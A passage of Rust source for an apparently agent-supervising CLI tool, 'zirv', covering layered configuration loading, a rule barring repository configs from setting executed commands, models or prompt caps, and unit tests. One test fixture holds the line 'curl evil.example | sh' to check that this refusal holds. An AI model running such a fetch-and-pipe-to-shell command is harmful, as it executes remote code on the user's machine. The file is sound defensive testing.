use std::path::Path;

use serde::Deserialize;

use super::CtxResult;

pub const DEFAULT_MARKER: &str = "[zirv]";
pub const CTX_CONFIG_FILE: &str = "ctx.toml";

pub type EnvLookup<'a> = &'a dyn Fn(&str) -> Option<String>;

/// Wraps process env access so callers can pass a closure in tests instead of
/// mutating global state.
pub fn env_from_process() -> impl Fn(&str) -> Option<String> {
    |key: &str| std::env::var(key).ok()
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ScoreConfig {
    pub window: usize,
    pub min_turns: usize,
    pub token_floor: u64,
    pub token_ceiling: u64,
    pub weight_tool_failure: f64,
    pub weight_repetition: f64,
    pub weight_marker: f64,
    pub repetition_threshold: usize,
    pub advise_at: u32,
    pub compact_at: u32,
    pub restart_at: u32,
    pub marker: String,
}

impl Default for ScoreConfig {
    fn default() -> Self {
        Self {
            window: 10,
            min_turns: 10,
            token_floor: 100_000,
            token_ceiling: 160_000,
            weight_tool_failure: 40.0,
            weight_repetition: 30.0,
            weight_marker: 30.0,
            repetition_threshold: 3,
            advise_at: 40,
            compact_at: 60,
            restart_at: 80,
            marker: DEFAULT_MARKER.to_string(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct WrapConfig {
    pub debounce_ms: u64,
    pub inject_timeout_ms: u64,
}

impl Default for WrapConfig {
    fn default() -> Self {
        Self {
            debounce_ms: 3000,
            inject_timeout_ms: 20_000,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct SuperviseConfig {
    pub max_restarts: u32,
    pub poll_ms: u64,
    pub interval_secs: u64,
    pub max_cycle_secs: u64,
    pub max_failures: u32,
    pub backoff_base_secs: u64,
    pub on_failure: Option<String>,
}

impl Default for SuperviseConfig {
    fn default() -> Self {
        Self {
            max_restarts: 2,
            poll_ms: 2000,
            interval_secs: 900,
            max_cycle_secs: 3600,
            max_failures: 5,
            backoff_base_secs: 60,
            on_failure: None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct HandoffConfig {
    pub model: String,
    /// How many trailing items of each kind the handoff context keeps: user
    /// messages, assistant texts and tool errors. One knob, because
    /// `structural_context` applies one limit to all three.
    pub tail_items: usize,
    /// How long the distiller gets before the structural fallback is used
    /// instead. `wrap` calls this from its pump, so an unbounded wait would
    /// freeze the user's own terminal.
    pub timeout_secs: u64,
}

impl Default for HandoffConfig {
    fn default() -> Self {
        Self {
            model: "haiku".to_string(),
            tail_items: 5,
            timeout_secs: 30,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct PaceConfig {
    pub enabled: bool,
    /// A supervised window is kept at or below this percentage.
    pub max_percent: f64,
    /// Collector readings older than this are treated as stale.
    pub collector_max_age_secs: u64,
    pub estimator: bool,
    /// `0` disables the estimator for that window: a plan's real allowance is
    /// undocumented, so there is no honest default.
    pub five_hour_budget_tokens: u64,
    pub seven_day_budget_tokens: u64,
    pub count_cache_reads: bool,
    pub jitter_secs: u64,
    /// Used when a window's `resets_at` is unknown.
    pub fallback_delay_secs: u64,
    /// Head-room added to a window's own length to form the default safety cap,
    /// so a slightly wrong `resets_at` still resolves.
    pub wait_slack_secs: u64,
    /// Absolute override for the safety cap. `None` scales the cap to the window
    /// that tripped (5h or 7d, plus `wait_slack_secs`), which is what the spec's
    /// wait-until-reset semantics require: a global cap would resume early and
    /// spend tokens against a window that is still exhausted.
    pub max_wait_secs: Option<u64>,
}

impl Default for PaceConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            max_percent: 99.0,
            collector_max_age_secs: 900,
            estimator: true,
            five_hour_budget_tokens: 0,
            seven_day_budget_tokens: 0,
            count_cache_reads: false,
            jitter_secs: 30,
            fallback_delay_secs: 900,
            wait_slack_secs: 3600,
            max_wait_secs: None,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct OptimizeConfig {
    /// Whether the Stop hook may queue an "optimize recommended" entry.
    pub enabled: bool,
    pub sessions_sampled: usize,
    pub max_surface_bytes: usize,
    /// Empty reuses `handoff.model`: one cheap-model choice for the whole tool.
    pub model: String,
    pub recommend_tool_failure_rate: f64,
    pub recommend_corrections: usize,
    pub recommend_cooldown_secs: u64,
}

impl Default for OptimizeConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            sessions_sampled: 10,
            max_surface_bytes: 200_000,
            model: String::new(),
            recommend_tool_failure_rate: 0.25,
            recommend_corrections: 3,
            recommend_cooldown_secs: 86_400,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct PromptConfig {
    pub enabled: bool,
    /// Whether `<repo>/.zirv/system-prompt.md` is read at all.
    pub repo_layer: bool,
    /// Cap on the repo layer only: untrusted text does not get to be long.
    pub max_repo_bytes: usize,
}

impl Default for PromptConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            repo_layer: true,
            max_repo_bytes: 4096,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct MailConfig {
    pub enabled: bool,
    /// Cap on a stored message's body. Enforced by `mail::store`, which
    /// truncates rather than fails an oversize message.
    pub max_message_bytes: usize,
    /// Cap on how much mail is surfaced to a session at once (delivery is a
    /// later piece; the cap lives here so it is configured alongside the
    /// rest of the mailbox from the start).
    pub max_delivered_bytes: usize,
    /// How many unread messages a repo's mailbox keeps before the oldest are
    /// pruned. Read messages, already moved into `read/`, are never touched
    /// by this limit.
    pub keep: usize,
}

impl Default for MailConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            max_message_bytes: 4096,
            max_delivered_bytes: 4096,
            keep: 50,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct ChromeConfig {
    /// The launch banner naming the resolved harness, the rule that chose it,
    /// and the session id.
    pub banner: bool,
    /// The reserved bottom status bar (T12b).
    pub bar: bool,
    /// The `zirv ▸` announcement channel on stderr.
    pub events: bool,
}

impl Default for ChromeConfig {
    fn default() -> Self {
        Self {
            banner: true,
            bar: true,
            events: true,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Default, Deserialize)]
#[serde(default, deny_unknown_fields)]
pub struct CtxConfig {
    pub agent: Option<String>,
    pub agent_bin: Option<String>,
    pub score: ScoreConfig,
    pub wrap: WrapConfig,
    pub supervise: SuperviseConfig,
    pub handoff: HandoffConfig,
    pub pace: PaceConfig,
    pub optimize: OptimizeConfig,
    pub prompt: PromptConfig,
    pub mail: MailConfig,
    pub chrome: ChromeConfig,
    /// Per-agent enable/disable state from `.settings.toml`, a file this type
    /// deliberately never deserializes (see `crate::settings`): loaded
    /// separately at the end of `load`, and rejected outright if it appears
    /// as an `[agents]` table inside `ctx.toml` itself, so the two files stay
    /// distinct.
    #[serde(skip)]
    pub agents: crate::settings::AgentGate,
}

#[derive(Debug, Clone, Copy)]
enum EnvKind {
    Int,
    Float,
    Bool,
    /// Same parsing as `Bool`, but the parsed value is inverted before being
    /// inserted. `ZIRV_CTX_QUIET=true` needs to become `chrome.events =
    /// false`, and this is the one variable in `ENV_MAP` whose meaning is the
    /// negation of the config key it feeds.
    NegatedBool,
    Str,
}

const ENV_MAP: &[(&str, &[&str], EnvKind)] = &[
    ("ZIRV_CTX_AGENT", &["agent"], EnvKind::Str),
    ("ZIRV_CTX_AGENT_BIN", &["agent_bin"], EnvKind::Str),
    ("ZIRV_CTX_WINDOW", &["score", "window"], EnvKind::Int),
    ("ZIRV_CTX_MIN_TURNS", &["score", "min_turns"], EnvKind::Int),
    (
        "ZIRV_CTX_TOKEN_FLOOR",
        &["score", "token_floor"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_TOKEN_CEILING",
        &["score", "token_ceiling"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_MARKER", &["score", "marker"], EnvKind::Str),
    (
        "ZIRV_CTX_DEBOUNCE_MS",
        &["wrap", "debounce_ms"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_INJECT_TIMEOUT_MS",
        &["wrap", "inject_timeout_ms"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAX_RESTARTS",
        &["supervise", "max_restarts"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_POLL_MS", &["supervise", "poll_ms"], EnvKind::Int),
    (
        "ZIRV_CTX_INTERVAL_SECS",
        &["supervise", "interval_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAX_CYCLE_SECS",
        &["supervise", "max_cycle_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAX_FAILURES",
        &["supervise", "max_failures"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_ON_FAILURE",
        &["supervise", "on_failure"],
        EnvKind::Str,
    ),
    ("ZIRV_CTX_MODEL", &["handoff", "model"], EnvKind::Str),
    (
        "ZIRV_CTX_HANDOFF_TIMEOUT_SECS",
        &["handoff", "timeout_secs"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_PACE", &["pace", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_PACE_MAX_PERCENT",
        &["pace", "max_percent"],
        EnvKind::Float,
    ),
    (
        "ZIRV_CTX_PACE_FALLBACK_SECS",
        &["pace", "fallback_delay_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_MAX_WAIT_SECS",
        &["pace", "max_wait_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_SLACK_SECS",
        &["pace", "wait_slack_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_PACE_JITTER_SECS",
        &["pace", "jitter_secs"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_FIVE_HOUR_BUDGET",
        &["pace", "five_hour_budget_tokens"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_SEVEN_DAY_BUDGET",
        &["pace", "seven_day_budget_tokens"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_OPTIMIZE", &["optimize", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_OPTIMIZE_SESSIONS",
        &["optimize", "sessions_sampled"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_OPTIMIZE_MODEL",
        &["optimize", "model"],
        EnvKind::Str,
    ),
    ("ZIRV_CTX_PROMPT", &["prompt", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_PROMPT_REPO",
        &["prompt", "repo_layer"],
        EnvKind::Bool,
    ),
    (
        "ZIRV_CTX_PROMPT_MAX_REPO_BYTES",
        &["prompt", "max_repo_bytes"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_MAIL", &["mail", "enabled"], EnvKind::Bool),
    (
        "ZIRV_CTX_MAIL_MAX_BYTES",
        &["mail", "max_message_bytes"],
        EnvKind::Int,
    ),
    (
        "ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES",
        &["mail", "max_delivered_bytes"],
        EnvKind::Int,
    ),
    ("ZIRV_CTX_MAIL_KEEP", &["mail", "keep"], EnvKind::Int),
    (
        "ZIRV_CTX_CHROME_BANNER",
        &["chrome", "banner"],
        EnvKind::Bool,
    ),
    ("ZIRV_CTX_CHROME_BAR", &["chrome", "bar"], EnvKind::Bool),
    // Not `["chrome", "events"], EnvKind::Bool`: quiet is the inverse of
    // events, so this is the one entry that needs `NegatedBool`.
    (
        "ZIRV_CTX_QUIET",
        &["chrome", "events"],
        EnvKind::NegatedBool,
    ),
];

fn merge(base: &mut toml::Table, over: toml::Table) {
    for (key, value) in over {
        match (base.get_mut(&key), value) {
            (Some(toml::Value::Table(existing)), toml::Value::Table(incoming)) => {
                merge(existing, incoming);
            }
            (_, value) => {
                base.insert(key, value);
            }
        }
    }
}

fn insert_path(table: &mut toml::Table, path: &[&str], value: toml::Value) {
    let Some((head, rest)) = path.split_first() else {
        return;
    };
    if rest.is_empty() {
        table.insert((*head).to_string(), value);
        return;
    }
    let entry = table
        .entry((*head).to_string())
        .or_insert_with(|| toml::Value::Table(toml::Table::new()));
    if !entry.is_table() {
        *entry = toml::Value::Table(toml::Table::new());
    }
    if let Some(child) = entry.as_table_mut() {
        insert_path(child, rest, value);
    }
}

fn env_value(raw: &str, kind: EnvKind) -> CtxResult<toml::Value> {
    match kind {
        EnvKind::Str => Ok(toml::Value::String(raw.to_string())),
        EnvKind::Int => raw
            .parse::<i64>()
            .map(toml::Value::Integer)
            .map_err(|_| format!("expected an integer, got '{raw}'").into()),
        EnvKind::Float => raw
            .parse::<f64>()
            .map(toml::Value::Float)
            .map_err(|_| format!("expected a number, got '{raw}'").into()),
        EnvKind::Bool => raw
            .parse::<bool>()
            .map(toml::Value::Boolean)
            .map_err(|_| format!("expected true or false, got '{raw}'").into()),
        EnvKind::NegatedBool => raw
            .parse::<bool>()
            .map(|b| toml::Value::Boolean(!b))
            .map_err(|_| format!("expected true or false, got '{raw}'").into()),
    }
}

/// Keys a repository is not allowed to set, with the environment variable that
/// sets each one instead. Cloning a repository must not be enough to choose the
/// binary zirv launches, the shell command it runs on failure, or the model it
/// spends tokens on. `~/.zirv/ctx.toml`, `ZIRV_CTX_*` and flags all still may:
/// those come from the operator, not from the checkout.
const REPO_FORBIDDEN: &[(&[&str], &str)] = &[
    (&["agent_bin"], "ZIRV_CTX_AGENT_BIN"),
    (&["supervise", "on_failure"], "ZIRV_CTX_ON_FAILURE"),
    (&["handoff", "model"], "ZIRV_CTX_MODEL"),
    (&["optimize", "model"], "ZIRV_CTX_OPTIMIZE_MODEL"),
    (&["prompt", "enabled"], "ZIRV_CTX_PROMPT"),
    (&["prompt", "repo_layer"], "ZIRV_CTX_PROMPT_REPO"),
    // Without this the cap would be decorative: the untrusted layer could
    // simply raise its own limit.
    (
        &["prompt", "max_repo_bytes"],
        "ZIRV_CTX_PROMPT_MAX_REPO_BYTES",
    ),
];

fn value_at<'a>(table: &'a toml::Table, path: &[&str]) -> Option<&'a toml::Value> {
    let (head, rest) = path.split_first()?;
    let value = table.get(*head)?;
    if rest.is_empty() {
        return Some(value);
    }
    value_at(value.as_table()?, rest)
}

/// Loud rather than silent: a repo that sets one of these gets a message
/// naming the key and where to put it, which beats wondering why the value in
/// the file is being ignored.
fn reject_untrusted_keys(layer: &toml::Table, path: &Path) -> CtxResult<()> {
    for (key, variable) in REPO_FORBIDDEN {
        if value_at(layer, key).is_some() {
            return Err(format!(
                "{}: `{}` may not be set by a repository config, because it names something zirv \
                 then runs. Set it in ~/{}/{} or with {} instead.",
                path.display(),
                key.join("."),
                crate::utils::SCRIPT_DIR_NAME,
                CTX_CONFIG_FILE,
                variable
            )
            .into());
        }
    }
    Ok(())
}

fn read_layer(path: &Path, into: &mut toml::Table) -> CtxResult<()> {
    if !path.exists() {
        return Ok(());
    }
    let text = std::fs::read_to_string(path)?;
    let layer: toml::Table =
        toml::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))?;
    merge(into, layer);
    Ok(())
}

impl CtxConfig {
    /// Layers `~/.zirv/ctx.toml`, then `<repo>/.zirv/ctx.toml`, then
    /// `ZIRV_CTX_*`. Flags are applied by each verb after loading.
    pub fn load(repo: &Path, env: EnvLookup<'_>) -> CtxResult<Self> {
        let mut merged = toml::Table::new();

        if let Ok(home) = crate::utils::home_dir() {
            read_layer(
                &home
                    .join(crate::utils::SCRIPT_DIR_NAME)
                    .join(CTX_CONFIG_FILE),
                &mut merged,
            )?;
        }
        // Read on its own first: the repo layer is the one layer that comes
        // from a checkout rather than from the operator.
        let repo_path = repo
            .join(crate::utils::SCRIPT_DIR_NAME)
            .join(CTX_CONFIG_FILE);
        let mut repo_layer = toml::Table::new();
        read_layer(&repo_path, &mut repo_layer)?;
        reject_untrusted_keys(&repo_layer, &repo_path)?;
        merge(&mut merged, repo_layer);

        for (var, path, kind) in ENV_MAP {
            if let Some(raw) = env(var) {
                let value = env_value(&raw, *kind).map_err(|e| format!("{var}: {e}"))?;
                insert_path(&mut merged, path, value);
            }
        }

        let mut cfg: Self = toml::Value::Table(merged)
            .try_into()
            .map_err(|e| format!("invalid ctx config: {e}"))?;
        cfg.agents = crate::settings::AgentGate::load(repo, env)?;
        Ok(cfg)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;

    fn env_map(pairs: &[(&str, &str)]) -> HashMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| ((*k).to_string(), (*v).to_string()))
            .collect()
    }

    #[test]
    fn defaults_match_the_spec() {
        let cfg = ScoreConfig::default();
        assert_eq!(cfg.window, 10);
        assert_eq!(cfg.min_turns, 10);
        assert_eq!(cfg.token_floor, 100_000);
        assert_eq!(cfg.token_ceiling, 160_000);
        assert_eq!(cfg.advise_at, 40);
        assert_eq!(cfg.compact_at, 60);
        assert_eq!(cfg.restart_at, 80);
        assert_eq!(cfg.marker, "[zirv]");
        assert_eq!(cfg.repetition_threshold, 3);
        assert_eq!(
            cfg.weight_tool_failure + cfg.weight_repetition + cfg.weight_marker,
            100.0,
            "weights must sum to 100 so an all-signals session can reach restart"
        );
        assert_eq!(WrapConfig::default().debounce_ms, 3000);
        assert_eq!(SuperviseConfig::default().max_restarts, 2);
        assert_eq!(HandoffConfig::default().model, "haiku");
        assert_eq!(HandoffConfig::default().tail_items, 5);
        assert_eq!(HandoffConfig::default().timeout_secs, 30);
    }

    #[test]
    fn repo_file_overrides_defaults_and_env_overrides_repo() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[score]\nwindow = 4\ntoken_floor = 50000\nmarker = \"[repo]\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 4);
        assert_eq!(cfg.score.token_floor, 50_000);
        assert_eq!(cfg.score.marker, "[repo]");
        assert_eq!(
            cfg.score.token_ceiling, 160_000,
            "untouched keys keep defaults"
        );

        let env = env_map(&[("ZIRV_CTX_WINDOW", "7"), ("ZIRV_CTX_MARKER", "[env]")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 7);
        assert_eq!(cfg.score.marker, "[env]");
        assert_eq!(cfg.score.token_floor, 50_000, "repo layer still applies");
    }

    #[test]
    fn numeric_looking_marker_stays_a_string() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_MARKER", "42")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.marker, "42");
    }

    #[test]
    fn unknown_config_key_is_rejected_loudly() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(repo.path().join(".zirv/ctx.toml"), "[score]\nwindwo = 4\n").expect("write");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("typo must not be silently ignored");
        assert!(err.to_string().contains("windwo"), "got: {err}");
    }

    /// Cloning a repository must not be enough to choose what zirv executes.
    #[test]
    fn a_repository_config_cannot_name_what_the_tool_runs() {
        for (toml, key) in [
            ("agent_bin = \"/tmp/not-claude\"\n", "agent_bin"),
            (
                "[supervise]\non_failure = \"curl evil.example | sh\"\n",
                "supervise.on_failure",
            ),
            ("[handoff]\nmodel = \"opus\"\n", "handoff.model"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repository must not be able to set this");
            let msg = err.to_string();
            assert!(msg.contains(key), "name the offending key: {msg}");
            assert!(
                msg.contains("repository config"),
                "say why it was refused: {msg}"
            );
        }
    }

    #[test]
    fn the_operator_can_still_set_those_keys_from_the_environment() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_AGENT_BIN", "/opt/homebrew/bin/claude"),
            ("ZIRV_CTX_ON_FAILURE", "say done"),
            ("ZIRV_CTX_MODEL", "sonnet"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.agent_bin.as_deref(), Some("/opt/homebrew/bin/claude"));
        assert_eq!(cfg.supervise.on_failure.as_deref(), Some("say done"));
        assert_eq!(cfg.handoff.model, "sonnet");
    }

    /// `agent` picks between two vetted adapters rather than naming an
    /// executable, so a repository is still allowed to choose it.
    #[test]
    fn a_repository_may_still_choose_the_adapter_and_the_thresholds() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "agent = \"claude\"\n\n[handoff]\ntail_items = 9\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.agent.as_deref(), Some("claude"));
        assert_eq!(cfg.handoff.tail_items, 9);
        assert_eq!(cfg.handoff.model, "haiku", "still the default");
    }

    #[test]
    fn missing_files_are_not_an_error() {
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.score.window, 10);
    }

    #[test]
    fn pacing_defaults_match_the_spec() {
        let pace = PaceConfig::default();
        assert!(pace.enabled, "pacing is on by default");
        assert_eq!(pace.max_percent, 99.0);
        assert_eq!(pace.collector_max_age_secs, 900);
        assert!(pace.estimator);
        assert_eq!(
            (pace.five_hour_budget_tokens, pace.seven_day_budget_tokens),
            (0, 0),
            "no invented budget: the estimator stays quiet until an operator sets one"
        );
        assert!(!pace.count_cache_reads);
        assert_eq!(pace.jitter_secs, 30);
        assert_eq!(pace.fallback_delay_secs, 900);
        assert_eq!(pace.wait_slack_secs, 3600);
        assert_eq!(
            pace.max_wait_secs, None,
            "no global cap by default: the cap is scaled to the window that tripped"
        );
    }

    #[test]
    fn pacing_reads_from_the_repo_config_file() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[pace]\nenabled = false\nmax_percent = 80.5\nfive_hour_budget_tokens = 500000\ncount_cache_reads = true\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.pace.enabled);
        assert_eq!(cfg.pace.max_percent, 80.5);
        assert_eq!(cfg.pace.five_hour_budget_tokens, 500_000);
        assert!(cfg.pace.count_cache_reads);
        assert_eq!(
            cfg.pace.fallback_delay_secs, 900,
            "untouched keys keep defaults"
        );
    }

    #[test]
    fn pacing_env_overrides_cover_floats_and_bools() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[
            ("ZIRV_CTX_PACE", "false"),
            ("ZIRV_CTX_PACE_MAX_PERCENT", "75"),
            ("ZIRV_CTX_FIVE_HOUR_BUDGET", "1000"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(!cfg.pace.enabled);
        assert_eq!(
            cfg.pace.max_percent, 75.0,
            "an integer literal must load as a float"
        );
        assert_eq!(cfg.pace.five_hour_budget_tokens, 1000);
    }

    #[test]
    fn a_non_numeric_percent_is_rejected_with_the_variable_named() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PACE_MAX_PERCENT", "loads")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad float");
        let msg = err.to_string();
        assert!(msg.contains("ZIRV_CTX_PACE_MAX_PERCENT"), "got {msg}");
    }

    #[test]
    fn a_non_boolean_flag_is_rejected() {
        let repo = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PACE", "yes-please")]);
        let err = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect_err("bad bool");
        assert!(err.to_string().contains("ZIRV_CTX_PACE"));
    }

    #[test]
    fn optimize_defaults_are_conservative() {
        let optimize = OptimizeConfig::default();
        assert!(optimize.enabled, "the hook recommendation is on by default");
        assert_eq!(optimize.sessions_sampled, 10);
        assert_eq!(optimize.max_surface_bytes, 200_000);
        assert_eq!(
            optimize.model, "",
            "empty means reuse the handoff model rather than inventing a second default"
        );
        assert_eq!(optimize.recommend_tool_failure_rate, 0.25);
        assert_eq!(optimize.recommend_corrections, 3);
        assert_eq!(optimize.recommend_cooldown_secs, 86_400);
    }

    #[test]
    fn optimize_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[optimize]\nsessions_sampled = 3\nrecommend_corrections = 9\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.optimize.sessions_sampled, 3);
        assert_eq!(cfg.optimize.recommend_corrections, 9);

        let env = env_map(&[("ZIRV_CTX_OPTIMIZE_SESSIONS", "7")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.optimize.sessions_sampled, 7);
    }

    #[test]
    fn prompt_defaults_inject_with_a_capped_repo_layer() {
        let prompt = PromptConfig::default();
        assert!(prompt.enabled);
        assert!(prompt.repo_layer);
        assert_eq!(prompt.max_repo_bytes, 4096);
    }

    #[test]
    fn a_repo_may_not_enable_its_own_prompt_layer_or_raise_its_cap() {
        // The same trust boundary as agent_bin: a checkout must not be able to
        // decide that text from the checkout gets injected, nor how much of it.
        // A repo that could raise max_repo_bytes would make the cap decorative.
        for (key, value) in [
            ("enabled", "true"),
            ("repo_layer", "true"),
            ("max_repo_bytes", "1000000"),
        ] {
            let repo = tempfile::tempdir().expect("tempdir");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[prompt]\n{key} = {value}\n"),
            )
            .expect("write");

            let empty = env_map(&[]);
            let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
                .expect_err("a repo may not set this key")
                .to_string();
            assert!(err.contains(&format!("prompt.{key}")), "got {err}");
            assert!(
                err.contains("ZIRV_CTX_PROMPT"),
                "the error names where the operator may set it: {err}"
            );
        }
    }

    #[test]
    fn the_operator_may_still_raise_the_repo_cap() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT_MAX_REPO_BYTES", "9000")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.prompt.max_repo_bytes, 9000);
    }

    #[test]
    fn the_operator_may_still_set_prompt_keys() {
        let home_only = tempfile::tempdir().expect("tempdir");
        let env = env_map(&[("ZIRV_CTX_PROMPT", "false")]);
        let cfg = CtxConfig::load(home_only.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(
            !cfg.prompt.enabled,
            "the environment is the operator, not the checkout"
        );
    }

    #[test]
    fn a_repo_may_not_choose_the_optimize_model() {
        // Same trust boundary as handoff.model: a checkout must not name the
        // model zirv spends tokens on.
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[optimize]\nmodel = \"opus\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("repo may not set optimize.model");
        let msg = err.to_string();
        assert!(msg.contains("optimize.model"), "got {msg}");
        assert!(
            msg.contains("ZIRV_CTX_OPTIMIZE_MODEL"),
            "name the alternative: {msg}"
        );
    }

    #[test]
    fn mail_defaults_are_enabled_with_sane_caps() {
        let mail = MailConfig::default();
        assert!(mail.enabled, "the mailbox is on by default");
        assert_eq!(mail.max_message_bytes, 4096);
        assert_eq!(mail.max_delivered_bytes, 4096);
        assert_eq!(mail.keep, 50);
    }

    #[test]
    fn mail_reads_config_and_env() {
        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[mail]\nkeep = 10\nmax_message_bytes = 2048\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.mail.keep, 10);
        assert_eq!(cfg.mail.max_message_bytes, 2048);
        assert_eq!(
            cfg.mail.max_delivered_bytes, 4096,
            "untouched keys keep defaults"
        );

        let env = env_map(&[
            ("ZIRV_CTX_MAIL", "false"),
            ("ZIRV_CTX_MAIL_MAX_BYTES", "512"),
            ("ZIRV_CTX_MAIL_MAX_DELIVERED_BYTES", "256"),
            ("ZIRV_CTX_MAIL_KEEP", "5"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
